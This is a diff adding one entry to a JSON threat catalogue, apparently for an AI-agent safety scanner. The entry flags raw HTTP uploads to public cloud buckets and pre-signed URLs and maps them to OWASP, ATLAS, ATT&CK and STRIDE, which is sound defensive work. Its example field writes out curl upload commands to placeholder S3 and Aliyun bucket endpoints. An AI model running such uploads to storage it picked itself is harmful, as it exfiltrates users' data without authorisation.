@@ -3380,6 +3380,46 @@
       "cweNote": "A missing threat-model review is a development-process gap, not a weakness in the product.",
       "capec": [],
       "capecNote": "No adversary acts: a trust-boundary change made during ordinary work is not an attack pattern."
+    },
+    {
+      "id": 86,
+      "category": "Data Exposure",
+      "threat": "Data uploaded to public cloud storage",
+      "example": "The agent uploads data with a raw HTTP client to a public object-storage bucket or a pre-signed URL: `curl -X PUT --data-binary … https://<bucket>.oss-<region>.aliyuncs.com/…`, `curl -T file https://<bucket>.s3.amazonaws.com/…`, an Azure Blob, Google Cloud Storage, Cloudflare R2, Tencent COS or Huawei OBS endpoint, or a URL carrying a signature (X-Amz-Signature, OSSAccessKeyId, an Azure SAS sig=). A download from a bucket is not an upload.",
+      "response": "Review where the data is going before it is sent. Anyone holding the bucket or the signed URL reads back what lands there, which makes a bucket the agent picked itself an exfiltration drop; uploading to your own bucket is ordinary work, so this is report-only by default.",
+      "saferAlternative": "Upload with your cloud provider's CLI and the account your organisation configured, and allow-list your own buckets in egress rules.",
+      "severity": 4,
+      "likelihood": 2,
+      "riskScore": 8,
+      "riskLevel": "Medium",
+      "sources": [
+        "Agent safety",
+        "OWASP"
+      ],
+      "owasp": "LLM02",
+      "atlas": "AML.T0086",
+      "atlasPartial": {
+        "AML.T0086": "raw HTTP uploads to object storage only"
+      },
+      "owaspAgentic": [
+        "ASI02"
+      ],
+      "owaspAgenticPartial": {
+        "ASI02": "raw HTTP uploads to object storage only"
+      },
+      "owaspMcp": [],
+      "attack": [
+        {
+          "id": "T1567.002",
+          "coverage": "partial",
+          "reason": "curl, wget and Invoke-WebRequest uploads to public object storage or a pre-signed URL; provider CLIs are not covered"
+        }
+      ],
+      "stride": "Information Disclosure",
+      "cwe": [],
+      "cweNote": "Collection and egress are what follows once the agent is steered; the weakness that let it be steered (e.g. CWE-1427) belongs to the rule that sees the entry point, not to this one.",
+      "capec": [],
+      "capecNote": "CAPEC (3.9) has no exfiltration or cloud-storage upload attack pattern."
     }
   ]
 }
